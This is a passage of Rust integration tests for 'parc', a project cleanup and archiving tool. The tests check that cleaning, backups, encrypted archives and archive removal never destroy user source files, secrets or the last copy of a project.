    let p = scan::analyze(f.path());
    let c = cmds(f.path(), &p);
    assert!(c.contains(&"gradle build".to_string()), "{c:?}");
}

#[test]
fn swift_build_directory_is_rebuilt_by_swift() {
    let f = Fixture::new();
    f.repo()
        .file("Package.swift", "// swift-tools-version:5.9")
        .file("Package.resolved", "{}")
        .file(".gitignore", ".build/\n")
        .file("Sources/App/main.swift", "print(1)")
        .heavy(".build/debug")
        .commit();

    let p = scan::analyze(f.path());
    assert_eq!(artifact(&p, ".build").class, Class::Confirmed);

    let c = cmds(f.path(), &p);
    assert!(c.contains(&"swift build".to_string()), "{c:?}");
}

/// CMake builds out of source: the directory that was removed is the cache *and*
/// the output, so it has to be configured again before it can be built.
#[test]
fn cmake_reconfigures_before_building() {
    let f = Fixture::new();
    f.repo()
        .file("CMakeLists.txt", "project(demo)")
        .file(".gitignore", "build/\n")
        .file("src/main.c", "int main(){}")
        .heavy("build/CMakeFiles")
        .commit();

    let p = scan::analyze(f.path());
    let c = cmds(f.path(), &p);
    assert!(
        c.contains(&"cmake -S . -B build && cmake --build build".to_string()),
        "{c:?}"
    );
}

/// `engines: ">=20"` is a floor, not a pin - Node 24 satisfies it. Warning
/// anyway teaches people to ignore the warning that does matter.
#[test]
fn a_runtime_range_is_not_a_version_mismatch() {
    assert!(parc::recipe::runtime_satisfied(">=20", "v24.8.0"));
    assert!(parc::recipe::runtime_satisfied("22", "v22.1.0"));
    assert!(!parc::recipe::runtime_satisfied("22", "v18.0.0"));
    assert!(!parc::recipe::runtime_satisfied(">=20", "v18.0.0"));
}

fn backup_opts(out: &Fixture) -> parc::backup::Options {
    parc::backup::Options {
        out_dir: out.path().to_path_buf(),
        level: 1,
        force: false,
        overwrite: false,
        dry_run: false,
        encrypt: None,
    }
}

/// `backup` archives and leaves the project exactly where it was. There is no
/// flag here that deletes, and no code path to one.
#[test]
fn backup_archives_the_project_and_changes_nothing_on_disk() {
    let lib = Fixture::new();
    let f = Fixture::new();
    f.repo()
        .file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file(".gitignore", "node_modules\n.env\n")
        .file(".env", "SECRET=1")
        .file("src/index.js", "console.log(1)")
        .heavy("node_modules/left-pad")
        .commit();

    let p = scan::analyze(f.path());
    let written = parc::backup::run(std::slice::from_ref(&p), &backup_opts(&lib)).unwrap();
    assert!(written > 0, "an archive should have been written");

    // Every single thing that was there is still there.
    assert!(f.path().join("node_modules/left-pad").exists(), "node_modules was deleted");
    assert!(f.path().join("src/index.js").exists());
    assert!(f.path().join(".env").exists());
    assert!(f.path().join(".git").exists());
    assert!(f.path().join("pnpm-lock.yaml").exists());

    // And the archive it wrote is the cleaned one: the artifact is out, the
    // secret git refused to keep is in.
    let items = parc::archive::list(lib.path()).unwrap();
    assert_eq!(items.len(), 1);
    let mf = items[0].manifest.as_ref().unwrap();
    assert!(mf.removed.iter().any(|r| r.path == "node_modules"));
    assert!(!mf.files.iter().any(|x| x.path.starts_with("node_modules")));
    assert!(mf.files.iter().any(|x| x.path == ".env"));
}

/// A project that needs a human does not silently take the whole batch down with
/// it, and does not get archived behind their back either.
#[test]
fn backup_skips_a_review_project_but_keeps_going() {
    let lib = Fixture::new();

    let ok = Fixture::new();
    ok.repo()
        .file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file(".gitignore", "node_modules\n")
        .heavy("node_modules/left-pad")
        .commit();

    // No lockfile: `node_modules` cannot be vouched for, so this is REVIEW.
    let review = Fixture::new();
    review
        .file("package.json", "{}")
        .heavy("node_modules/left-pad");

    let projects = vec![scan::analyze(ok.path()), scan::analyze(review.path())];
    assert_eq!(projects[1].verdict, Verdict::Review);

    parc::backup::run(&projects, &backup_opts(&lib)).unwrap();

    let items = parc::archive::list(lib.path()).unwrap();
    assert_eq!(items.len(), 1, "only the sound one should have been archived");
    assert!(items[0].name().contains(
        ok.path().file_name().unwrap().to_str().unwrap()
    ));
}

/// `clean` frees the disk of a project you are still working on: the generated
/// directories go, everything else stays. It never archives and never moves the
/// project.
#[test]
fn clean_deletes_artifacts_in_place_and_nothing_else() {
    let f = Fixture::new();
    f.repo()
        .file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file(".gitignore", "node_modules\n.env\n")
        .file(".env", "SECRET=1")
        .file("src/index.js", "console.log(1)")
        .heavy("node_modules/left-pad")
        .commit();

    let p = scan::analyze(f.path());
    let freed = parc::clean::run(
        std::slice::from_ref(&p),
        &parc::clean::Options { yes: true, dry_run: false },
    )
    .unwrap();

    assert!(freed > 0);
    assert!(!f.path().join("node_modules").exists(), "the artifact should have been deleted");

    // The project itself is untouched - this is the whole difference between
    // `clean` and `archive`.
    assert!(f.path().join("src/index.js").exists(), "source code was deleted");
    assert!(f.path().join(".env").exists(), "gitignored secret was deleted");
    assert!(f.path().join(".git").exists(), "git history was deleted");
    assert!(f.path().join("pnpm-lock.yaml").exists(), "lockfile was deleted");
}

/// Finder rewrites `.DS_Store` into any folder it is displaying - `node_modules`
/// included - and it does it *while* we are deleting. `remove_dir_all` empties a
/// directory, calls `rmdir`, and in the gap between the two the file is back:
/// ENOTEMPTY. std then abandons the whole tree and reports the failure against
/// the path it was asked about, so a single 6 KB file three levels down left
/// 687 MB of `node_modules` on the disk and said "node_modules: Directory not
/// empty". This happened on a real machine.
#[test]
fn a_file_reappearing_mid_delete_does_not_defeat_clean() {
    use std::sync::atomic::{AtomicBool, Ordering as O};
    use std::sync::Arc;

    let f = Fixture::new();
    f.repo()
        .file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file(".gitignore", "node_modules\n")
        .commit();

    // A tree wide enough that the deletion is still running when the writer
    // starts putting files back into it.
    for i in 0..40 {
        f.heavy(&format!("node_modules/pkg-{i}/dist"));
    }

    let nm = f.path().join("node_modules");
    let stop = Arc::new(AtomicBool::new(false));

    let writer = {
        let nm = nm.clone();
        let stop = stop.clone();
        std::thread::spawn(move || {
            // Play Finder: keep dropping .DS_Store into directories that still
            // exist. Writes into an already-deleted directory simply fail, so
            // this can never resurrect the tree after the delete has finished.
            while !stop.load(O::Acquire) {
                if let Ok(rd) = fs::read_dir(&nm) {
                    for e in rd.flatten() {
                        let _ = fs::write(e.path().join(".DS_Store"), b"junk");
                    }
                }
                std::thread::yield_now();
            }
        })
    };

    let p = scan::analyze(f.path());
    let freed = parc::clean::run(
        std::slice::from_ref(&p),
        &parc::clean::Options { yes: true, dry_run: false },
    )
    .unwrap();

    stop.store(true, O::Release);
    writer.join().unwrap();

    assert!(!nm.exists(), "node_modules stayed because of a reappearing file");
    assert!(freed > 0);
}

#[test]
fn clean_dry_run_deletes_nothing() {
    let f = Fixture::new();
    f.repo()
        .file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file(".gitignore", "node_modules\n")
        .heavy("node_modules/left-pad")
        .commit();

    let p = scan::analyze(f.path());
    let freed = parc::clean::run(
        std::slice::from_ref(&p),
        &parc::clean::Options { yes: true, dry_run: true },
    )
    .unwrap();

    assert_eq!(freed, 0);
    assert!(f.path().join("node_modules/left-pad").exists());
}

/// `archive` takes the project away, so it asks first - and it asks *before* the
/// compression, not after it. Refusing means nothing happened at all: no archive,
/// no move.
#[test]
fn archive_will_not_take_a_project_without_being_asked() {
    let lib = Fixture::new();
    let f = Fixture::new();
    f.repo()
        .file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file("src/index.js", "console.log(1)")
        .commit();

    // yes: false with no terminal on stdin - the prompt reads EOF and declines.
    let err = parc::archive::create(
        f.path(),
        &parc::archive::Options {
            out_dir: lib.path().to_path_buf(),
            level: 1,
            delete: true,
            force: false,
            overwrite: false,
            yes: false,
            encrypt: None,
        },
    )
    .unwrap_err();

    assert!(err.to_string().contains("cancelled"), "{err}");
    assert!(f.path().join("src/index.js").exists(), "project was moved");
    assert!(
        parc::archive::list(lib.path()).unwrap().is_empty(),
        "an archive was written even though no confirmation was given"
    );
}

/// `clean` keeps no journal of what it deleted, and does not need one: a
/// lockfile with no `node_modules` beside it is a project that was installed once
/// and is not installed now. That reasoning also works for projects cleaned long
/// before this command existed.
#[test]
fn setup_finds_what_clean_took_away() {
    let f = Fixture::new();
    f.file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file("prisma/schema.prisma", "generator client {}")
        .file("src/index.js", "1");

    let steps = parc::recipe::needed(f.path());
    let cmds: Vec<&str> = steps.iter().map(|s| s.cmd.as_str()).collect();

    assert!(cmds.contains(&"pnpm install"), "{cmds:?}");
    assert!(cmds.contains(&"pnpm prisma generate"), "{cmds:?}");
    assert!(steps.iter().find(|s| s.cmd == "pnpm install").unwrap().dir.is_none());
}

/// Nothing is missing, so nothing is claimed. Proposing `pnpm install` for a
/// project that is already installed would make the command noise.
#[test]
fn setup_says_nothing_about_a_project_that_is_already_installed() {
    let f = Fixture::new();
    f.file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .heavy("node_modules/left-pad");

    assert!(parc::recipe::needed(f.path()).is_empty());
}

/// The trap: in a pnpm workspace only the root holds a lockfile, and the single
/// install at the root is what fills every package's `node_modules`. Running an
/// install inside each package would be wrong - and for pnpm, would fail.
#[test]
fn setup_installs_a_workspace_once_at_its_root() {
    let f = Fixture::new();
    f.file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file("pnpm-workspace.yaml", "packages:\n  - packages/*\n")
        .file("packages/api/package.json", "{}")
        .file("packages/web/package.json", "{}");

    let steps = parc::recipe::needed(f.path());
    let installs: Vec<&parc::recipe::Step> =
        steps.iter().filter(|s| s.cmd.ends_with("install")).collect();

    assert_eq!(installs.len(), 1, "a workspace must be installed once: {steps:?}");
    assert!(installs[0].dir.is_none(), "the install must be at the root");
}

/// A nested project that has its own lockfile is its own install, and gets its
/// own step - with the directory to run it in.
#[test]
fn setup_handles_a_nested_project_with_its_own_lockfile() {
    let f = Fixture::new();
    f.file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .heavy("node_modules/left-pad") // root is installed; only the child is not
        .file("tools/scraper/package.json", "{}")
        .file("tools/scraper/package-lock.json", "{}");

    let steps = parc::recipe::needed(f.path());
    assert_eq!(steps.len(), 1, "{steps:?}");
    assert_eq!(steps[0].cmd, "npm install");
    assert_eq!(steps[0].dir.as_deref(), Some("tools/scraper"));
}

/// Every module in an Android project has its own `build.gradle` and its own
/// `build/`, but the build is run once, from the top. Proposing `gradle build`
/// inside `android/app` gives someone a command that builds nothing.
#[test]
fn setup_proposes_one_gradle_build_at_the_root_not_one_per_module() {
    let f = Fixture::new();
    f.file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .heavy("node_modules/x")
        .file("android/settings.gradle", "include ':app'")
        .file("android/gradlew", "#!/bin/sh\n")
        .file("android/build.gradle", "// root")
        .file("android/app/build.gradle", "// module");

    let steps = parc::recipe::needed(f.path());
    let gradle: Vec<&parc::recipe::Step> =
        steps.iter().filter(|s| s.cmd.contains("gradle")).collect();

    assert_eq!(gradle.len(), 1, "{steps:?}");
    assert_eq!(gradle[0].cmd, "./gradlew build");
    assert_eq!(gradle[0].dir.as_deref(), Some("android"));
}

/// An archive holds exactly the files git refused to keep - `.env`, keys, a
/// `secrets/` folder. `--encrypt` is the answer for the ones where that matters,
/// and the round trip has to be airtight: nothing comes back without the
/// passphrase, and everything comes back with it.
#[test]
fn an_encrypted_archive_round_trips_only_with_the_passphrase() {
    use age::secrecy::SecretString;

    let lib = Fixture::new();
    let proj = Fixture::new();
    let out = Fixture::new();

    proj.file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file(".gitignore", "node_modules\n.env\n")
        .file(".env", "STRIPE_KEY=sk_live_fake")
        .file("src/index.js", "console.log(1)")
        .heavy("node_modules/left-pad")
        .repo()
        .commit();

    let pass = SecretString::from("correct horse battery staple".to_string());
    let file = parc::archive::create(
        proj.path(),
        &parc::archive::Options {
            out_dir: lib.path().to_path_buf(),
            level: 1,
            delete: false,
            force: false,
            overwrite: false,
            yes: true,
            encrypt: Some(pass.clone()),
        },
    )
    .unwrap();

    assert!(
        file.to_string_lossy().ends_with(".parc.tar.zst.age"),
        "an encrypted archive must announce itself: {}",
        file.display()
    );

    // The secret must not be sitting in the file in the clear.
    let raw = fs::read(&file).unwrap();
    assert!(
        !raw.windows(9).any(|w| w == b"sk_live_f"),
        "plaintext secret found in the encrypted archive"
    );

    // No passphrase, no manifest - not even the project's name.
    assert!(parc::archive::read_manifest(&file, None).is_err());
    assert!(parc::archive::read_manifest(
        &file,
        Some(&SecretString::from("wrong passphrase".to_string()))
    )
    .is_err());

    let mf = parc::archive::read_manifest(&file, Some(&pass)).unwrap();
    assert!(mf.removed.iter().any(|r| r.path == "node_modules"));

    let rep = parc::archive::verify(&file, Some(&pass)).unwrap();
    assert!(rep.ok());

    let dest = parc::archive::restore(
        &file,
        parc::archive::Target::Into(out.path().to_path_buf()),
        // Do not run `pnpm install` in a test.
        parc::archive::Setup {
            run: false,
            yes: false,
        },
        Some(&pass),
    )
    .unwrap();

    assert_eq!(
        fs::read_to_string(dest.join(".env")).unwrap(),
        "STRIPE_KEY=sk_live_fake",
        "the reason the archive exists must come back"
    );
    assert!(dest.join("src/index.js").exists());
    assert!(!dest.join("node_modules").exists());
}

/// `list` must never ask for a passphrase - a library can hold archives locked
/// with different ones. So an encrypted archive gives up nothing but its size,
/// and the listing has to be honest about that rather than guess.
#[test]
fn listing_an_encrypted_archive_leaks_nothing() {
    use age::secrecy::SecretString;

    let lib = Fixture::new();
    let proj = Fixture::new();
    proj.file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file("src/index.js", "1")
        .repo()
        .commit();

    parc::archive::create(
        proj.path(),
        &parc::archive::Options {
            out_dir: lib.path().to_path_buf(),
            level: 1,
            delete: false,
            force: false,
            overwrite: false,
            yes: true,
            encrypt: Some(SecretString::from("secret".to_string())),
        },
    )
    .unwrap();

    let items = parc::archive::list(lib.path()).unwrap();
    assert_eq!(items.len(), 1);
    assert!(items[0].encrypted);
    assert!(
        items[0].manifest.is_none(),
        "an encrypted archive's manifest must not be readable without a passphrase"
    );
    // The name still has to be typeable, or the archive cannot be restored.
    assert!(!items[0].name().is_empty());
}

/// `rm` cannot see inside an encrypted archive, and "I can't tell" is not the
/// same as "it's safe". Not knowing whether the project still exists on disk
/// earns the same protection as knowing it does not.
#[test]
fn rm_will_not_quietly_delete_an_archive_it_cannot_read() {
    use age::secrecy::SecretString;

    let lib = Fixture::new();
    let proj = Fixture::new();
    proj.file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file("src/index.js", "1")
        .repo()
        .commit();

    let file = parc::archive::create(
        proj.path(),
        &parc::archive::Options {
            out_dir: lib.path().to_path_buf(),
            level: 1,
            delete: false,
            force: false,
            overwrite: false,
            yes: true,
            encrypt: Some(SecretString::from("secret".to_string())),
        },
    )
    .unwrap();

    let err = parc::archive::remove(
        lib.path(),
        std::slice::from_ref(&file),
        &parc::archive::RemoveOptions { force: false, yes: true },
    )
    .unwrap_err();

    assert!(err.to_string().contains("encrypted"), "{err}");
    assert!(file.exists(), "an encrypted archive was silently deleted");
}

/// An encrypted archive renamed off its `.age` suffix is still encrypted, and `rm`
/// must still refuse it - the last-copy protection reads the age magic in the
/// file, not the extension. Keying off the name let a renamed encrypted archive
/// be waved through as an unreadable plaintext file and deleted without `--force`.
#[test]
fn a_renamed_encrypted_archive_still_resists_rm() {
    use age::secrecy::SecretString;

    let lib = Fixture::new();
    let proj = Fixture::new();
    proj.file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file("src/index.js", "1")
        .repo()
        .commit();

    let enc = parc::archive::create(
        proj.path(),
        &parc::archive::Options {
            out_dir: lib.path().to_path_buf(),
            level: 1,
            delete: false,
            force: false,
            overwrite: false,
            yes: true,
            encrypt: Some(SecretString::from("secret".to_string())),
        },
    )
    .unwrap();

    // Drop the `.age`: now only the bytes betray that it is encrypted.
    let renamed = lib.path().join("renamed.parc.tar.zst");
    fs::rename(&enc, &renamed).unwrap();

    let err = parc::archive::remove(
        lib.path(),
        std::slice::from_ref(&renamed),
        &parc::archive::RemoveOptions {
            force: false,
            yes: true,
        },
    )
    .unwrap_err();

    assert!(err.to_string().contains("encrypted"), "{err}");
    assert!(
        renamed.exists(),
        "a renamed encrypted archive was silently deleted"
    );
}

/// The archive of a project that is no longer on disk *is* the project. `list`
/// already says so ("archive-only"); deleting one without being told twice
/// would make this tool the thing that loses the work it exists to protect.
#[test]
fn deleting_the_last_copy_of_a_project_is_refused() {
    let lib = Fixture::new();
    let proj = Fixture::new();
    let file = archived(&proj, &lib);

    // The original goes away - the archive is now all there is.
    fs::remove_dir_all(proj.path()).unwrap();

    let err = parc::archive::remove(
        lib.path(),
        std::slice::from_ref(&file),
        // --yes is not --force: agreeing to a prompt is not agreeing to lose a
        // project you were never warned about.
        &parc::archive::RemoveOptions { force: false, yes: true },
    )
    .unwrap_err();

    assert!(
        err.to_string().contains("project could be lost"),
        "the reason for refusal must be stated: {err}"
    );
    assert!(file.exists(), "a refused archive must not have been deleted");
}

/// `parc rm a b` resolves and judges everything before the first file moves. The
/// alternative - refusing `b` only after `a` is already in the Trash - reports a
/// failure while having half-done the damage.
#[test]
fn one_blocked_archive_stops_the_whole_batch() {
    let lib = Fixture::new();
    let alive = Fixture::new();
    let dead = Fixture::new();

    let alive_file = archived(&alive, &lib);
    let dead_file = archived(&dead, &lib);
    fs::remove_dir_all(dead.path()).unwrap();

    let err = parc::archive::remove(
        lib.path(),
        &[alive_file.clone(), dead_file.clone()],
        &parc::archive::RemoveOptions { force: false, yes: true },
    )
    .unwrap_err();

    assert!(err.to_string().contains("project could be lost"), "{err}");
    assert!(
        alive_file.exists(),
        "the safe one was deleted anyway just because another archive was blocked"
    );
    assert!(dead_file.exists());
}

/// `scan` and `plan` promise to touch nothing. Plain `git status` breaks that
/// promise by rewriting `.git/index`'s stat cache.
#[test]
fn analyze_does_not_write_to_the_repo() {
    let f = Fixture::new();
    f.repo()
        .file("package.json", "{}")
        .file("src/index.js", "console.log(1)")
        .commit();

    let index = f.path().join(".git/index");
    // Invalidate git's stat cache so a refresh would want to write.
    let now = std::time::SystemTime::now();
    fs::File::open(f.path().join("src/index.js"))
        .unwrap()
        .set_modified(now)
        .unwrap();

    let before = fs::metadata(&index).unwrap().modified().unwrap();
    scan::analyze(f.path());
    let after = fs::metadata(&index).unwrap().modified().unwrap();

    assert_eq!(before, after, ".git/index was written - scan is not read-only");
}

/// A project name is the last two path components, so two clients can each have
/// an `app/backend` - and they did. Both resolved to `app-backend.parc.tar.zst`:
/// the second archive landed on the first, `backup` reported "2 projects
/// archived", and the library held one. If the first had been archived with
/// `parc archive`, its project was already in the Trash and the archive that
/// replaced it was somebody else's.
#[test]
fn two_projects_with_the_same_name_get_two_archives() {
    let lib = Fixture::new();
    let ws = Fixture::new();

    for client in ["acme", "globex"] {
        let root = ws.path().join(client).join("app").join("backend");
        fs::create_dir_all(root.join("src")).unwrap();
        fs::write(root.join("package.json"), "{}").unwrap();
        fs::write(root.join("pnpm-lock.yaml"), "lockfileVersion: 9").unwrap();
        fs::write(root.join("src/index.js"), format!("// {client}")).unwrap();
    }

    let acme = ws.path().join("acme/app/backend");
    let globex = ws.path().join("globex/app/backend");
    let projects = vec![scan::analyze(&acme), scan::analyze(&globex)];
    assert_eq!(projects[0].label(), projects[1].label(), "same label");

    parc::backup::run(
        &projects,
        &parc::backup::Options {
            out_dir: lib.path().to_path_buf(),
            level: 1,
            force: true,
            overwrite: true,
            dry_run: false,
            encrypt: None,
        },
    )
    .unwrap();

    let items = parc::archive::list(lib.path()).unwrap();
    assert_eq!(items.len(), 2, "two projects must be two archives: {:?}",
        items.iter().map(|i| i.name()).collect::<Vec<_>>());

    // And each one still knows which project it is.
    let homes: Vec<String> = items
        .iter()
        .map(|i| i.manifest.as_ref().unwrap().original_path.clone())
        .collect();
    assert!(homes.contains(&acme.display().to_string()), "{homes:?}");
    assert!(homes.contains(&globex.display().to_string()), "{homes:?}");
}

/// The name carries a fingerprint of the path so the two above cannot collide.
/// Nobody should have to type it: the label alone still resolves, as long as it
/// picks out one archive.
#[test]
fn an_archive_still_resolves_by_the_name_a_human_would_type() {
    let lib = Fixture::new();
    let proj = Fixture::new();
    let file = archived(&proj, &lib);

    // `<label>-<6 hex>`: the label a human reads, plus the fingerprint that keeps
    // two projects of the same name apart.
    let full = parc::archive::name_of(&file);
    let (label, fp) = full.rsplit_once('-').expect("the name must end with a fingerprint");
    assert_eq!(fp.len(), 6, "{full}");
    assert!(fp.chars().all(|c| c.is_ascii_hexdigit()), "{full}");

    // Typing the label alone is enough while it names one archive.
    let found = parc::archive::resolve_in(lib.path(), Path::new(label)).unwrap();
    assert_eq!(found, file, "not found by short name: {label}");
}

/// Re-archiving the same project rewrites its own archive rather than piling a
/// second one up beside it - that is what makes `backup` something you can run
/// every week.
#[test]
fn re_archiving_a_project_refreshes_its_own_archive() {
    let lib = Fixture::new();
    let proj = Fixture::new();

    let first = archived(&proj, &lib);
    proj.file("src/index.js", "console.log(2)");

    let second = parc::archive::create(
        proj.path(),
        &parc::archive::Options {
            out_dir: lib.path().to_path_buf(),
            level: 1,
            delete: false,
            force: false,
            overwrite: true,
            yes: true,
            encrypt: None,
        },
    )
    .unwrap();

    assert_eq!(first, second, "the same project must write to the same file");
    assert_eq!(parc::archive::list(lib.path()).unwrap().len(), 1);

    // Replaced, not unlinked. See `overwrite_never_destroys_the_archive_it_replaces`.
    let _ = fs::remove_file(trashed(&first));
}

/// An archive is never unlinked. Not even by the run that replaces it.
///
/// This is the tool's most-repeated rule - `parc rm` moves archives to the Trash
/// precisely because an archive can be the last copy of a project - and `create`
/// was the one place that broke it: `rename(2)` straight over the old file.
///
/// The way that ends: a weekly `parc backup --overwrite` cron, and a project whose
/// `src/` has gone off the disk in between (a bad `git clean -xfd`, an interrupted
/// sync). The cron runs its same line, a good forty-two-file archive is replaced by
/// a two-file one, and the good one is not in the Trash. It is nowhere.
#[test]
fn overwrite_never_destroys_the_archive_it_replaces() {
    let lib = Fixture::new();
    let proj = Fixture::new();

    let first = archived(&proj, &lib);
    let full = parc::archive::read_manifest(&first, None).unwrap().files.len();
    assert!(full >= 3);

    // The disaster: the source is gone from the disk, and the cron does not know.
    fs::remove_dir_all(proj.path().join("src")).unwrap();

    let second = parc::archive::create(
        proj.path(),
        &parc::archive::Options {
            out_dir: lib.path().to_path_buf(),
            level: 1,
            delete: false,
            force: true,
            overwrite: true,
            yes: true,
            encrypt: None,
        },
    )
    .unwrap();

    // The new archive is what it is - the project really did shrink, and it is not
    // this tool's place to argue. What matters is that the old one is still gettable.
    assert_eq!(first, second);
    let now = parc::archive::read_manifest(&second, None).unwrap().files.len();
    assert!(now < full, "{now} vs {full}");

    let old = trashed(&first);
    assert!(old.is_file(), "old archive was destroyed: {}", old.display());

    // And it is the *good* one, intact - not a stub.
    let saved = parc::archive::read_manifest(&old, None).unwrap();
    assert_eq!(saved.files.len(), full);
    assert!(parc::archive::verify(&old, None).unwrap().ok());

    fs::remove_file(&old).unwrap();
}

/// `verify` proves the archive matches its manifest. It cannot prove the archive
/// matches the *project* - and `archive` deletes the project on the strength of it.
///
/// The manifest and the tar are built from a single walk of the tree, so anything
/// that walk never saw is missing from both sides of the comparison and cancels
/// out. Twenty-five files written during one real run: the archive held **one**,
/// `parc verify` said SOUND, and the other twenty-four went to the Trash with the
/// project. An editor autosaving, a dev server, a sync client, a background `git` -
/// any of them, across a compression that can run for twenty minutes.
///
/// So the tree is walked again once the archive is on disk, and the project only
/// moves if it is still the project in the archive.
#[test]
fn a_project_that_changes_mid_archive_is_never_deleted() {
    let lib = Fixture::new();
    let f = Fixture::new();
    f.repo()
        .file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        .file("src/index.js", "1")
        .commit();

    // Enough incompressible bytes at level 19 that the write takes seconds, so the
    // writer below lands inside the run rather than after it.
    let noise: String = (0..3_000_000u32).map(|i| (b'a' + (i % 26) as u8) as char).rev().collect();
    f.file("src/big1.bin", &noise).file("src/big2.bin", &noise);

    let root = f.path().to_path_buf();
    let out = lib.path().to_path_buf();

    // Waits for the archive to actually start being written - the `.partial` file
    // appears at the top of `write_tar` - and only then touches the tree. No sleep
    // races the compression; the file is the signal.
    let writer = std::thread::spawn(move || {
        for _ in 0..600 {
            let started = fs::read_dir(&out).into_iter().flatten().flatten().any(|e| {
                e.file_name().to_string_lossy().ends_with(".partial")
            });
            if started {
                fs::write(root.join("src/new.js"), "two hours of work").unwrap();
                return true;
            }
            std::thread::sleep(std::time::Duration::from_millis(20));
        }
        false
    });

    let err = parc::archive::create(
        f.path(),
        &parc::archive::Options {
            out_dir: lib.path().to_path_buf(),
            level: 19,
            delete: true,
            force: true,
            overwrite: false,
            yes: true,
            encrypt: None,
        },
    )
    .unwrap_err();

    assert!(writer.join().unwrap(), "the writer did not see the archive start");
    assert!(err.to_string().contains("changed while archiving"), "{err}");
    assert!(err.to_string().contains("src/new.js"), "{err}");

    // The whole point: the project is still here, and so is the work.
    assert!(f.path().join("src/index.js").exists(), "project went to the Trash");
    assert_eq!(
        fs::read_to_string(f.path().join("src/new.js")).unwrap(),
        "two hours of work"
    );
}

/// A project has one archive, however it happens to be encrypted.
///
/// `--encrypt` changes the *file* name (`.parc.tar.zst` → `.parc.tar.zst.age`) but
/// not the *archive* name, and the archive name is the only handle anyone has:
/// `list` prints it, `resolve` takes it, `rm` and `restore` are given it. Archiving
/// the same project both ways left two files behind that `list` showed as two rows
/// with one identical name, while `resolve` quietly picked the plaintext one every
/// time. The encrypted archive was in the library, counted in its totals, and
/// impossible to name.
#[test]
fn a_project_cannot_end_up_with_a_plain_and_an_encrypted_archive() {
    let lib = Fixture::new();
    let proj = Fixture::new();

    let plain = archived(&proj, &lib);

    let opts = |overwrite: bool| parc::archive::Options {
        out_dir: lib.path().to_path_buf(),
        level: 1,
        delete: false,
        force: true,
        overwrite,
        yes: true,
        encrypt: Some(age::secrecy::SecretString::from("s3cret".to_string())),
    };

    // Without --overwrite it must refuse rather than write the second file.
    let err = parc::archive::create(proj.path(), &opts(false)).unwrap_err();
    assert!(err.to_string().contains("already exists"), "{err}");
    assert!(plain.exists(), "touched the existing archive while refusing");
    assert_eq!(parc::archive::list(lib.path()).unwrap().len(), 1);

    // With it, the encrypted archive replaces the plaintext one - it does not sit
    // down next to it.
    let enc = parc::archive::create(proj.path(), &opts(true)).unwrap();

    assert!(!plain.exists(), "the unencrypted archive stayed in the library");
    assert_ne!(enc, plain);

    let items = parc::archive::list(lib.path()).unwrap();
    assert_eq!(items.len(), 1, "one project left with two archives");
    assert!(items[0].encrypted);

    // And the one name everybody has for it still resolves - to the one that is
    // actually there.
    let by_name = parc::archive::resolve_in(lib.path(), Path::new(&items[0].name())).unwrap();
    assert_eq!(by_name, enc);

    // The replaced archive went to the real ~/.Trash, which is the right place for
    // it and the wrong place for test litter. The fixture name is unique per run,
    // so this is the file we put there.
    if let Some(home) = std::env::var_os("HOME") {
        let trashed = Path::new(&home)
            .join(".Trash")
            .join(plain.file_name().unwrap());
        let _ = fs::remove_file(trashed);
    }
}

/// `--overwrite` says "replace *this project's* archive". It has never said
/// "replace whatever happens to be sitting at that filename", and if the two ever
/// come apart the archive wins.
#[test]
fn overwrite_refuses_to_land_on_another_projects_archive() {
    let lib = Fixture::new();
    let mine = Fixture::new();
    let theirs = Fixture::new();

    let victim = archived(&theirs, &lib);

    // Force the collision the name is designed to prevent: put my archive's name
    // on their file.
    let p = scan::analyze(mine.path());
    let name = parc::archive::name_for(mine.path(), &p.label());
    let clash = lib.path().join(format!("{name}.parc.tar.zst"));
    fs::rename(&victim, &clash).unwrap();

    let err = parc::archive::create(
        mine.path(),
        &parc::archive::Options {
            out_dir: lib.path().to_path_buf(),
            level: 1,
            delete: false,
            force: true,
            overwrite: true,
            yes: true,
            encrypt: None,
        },
    )
    .unwrap_err();

    assert!(
        err.to_string().contains("another project's archive"),
        "{err}"
    );

    // Untouched: it is still their project in there.
    let mf = parc::archive::read_manifest(&clash, None).unwrap();
    assert_eq!(mf.original_path, theirs.path().display().to_string());
}

/// git collapses a fully-ignored directory into one entry, so `storage/` is all
/// it says about a `storage/` holding a database and an `out/`. Reading that as
/// "everything under it is generated" is what let `clean` unlink a folder of
/// PDFs - outright, not even to the Trash - while printing "these are generated
/// files, a lockfile rebuilds them".
///
/// The ignore *pattern* is the thing that knows: `app/build/` names the build
/// directory, `storage/` does not name `out`.
#[test]
fn clean_will_not_take_a_directory_the_gitignore_never_named() {
    let f = Fixture::new();
    f.repo()
        .file("package.json", "{}")
        .file("pnpm-lock.yaml", "lockfileVersion: 9")
        // Ignored because it is the user's data, not because it is generated.
        .file(".gitignore", "storage/\n")
        .file("src/index.js", "1")
        .commit();

    f.file("storage/db.sqlite", "CUSTOMER DATA")
        .heavy("storage/out");
    f.file("storage/out/report.pdf", "LAST YEAR'S REPORT");

    let p = scan::analyze(f.path());
    assert_eq!(
        artifact(&p, "storage/out").class,
        Class::Review,
        "gitignore names `storage`, not `out` - this folder cannot be deleted without confirmation"
    );
    assert_eq!(p.artifact_size, 0, "no deletable bytes");

    parc::clean::run(
        std::slice::from_ref(&p),
        &parc::clean::Options { yes: true, dry_run: false },
    )
    .unwrap();

    assert!(
        f.path().join("storage/out/report.pdf").exists(),
        "the user's report was deleted"
    );
    assert!(f.path().join("storage/db.sqlite").exists());
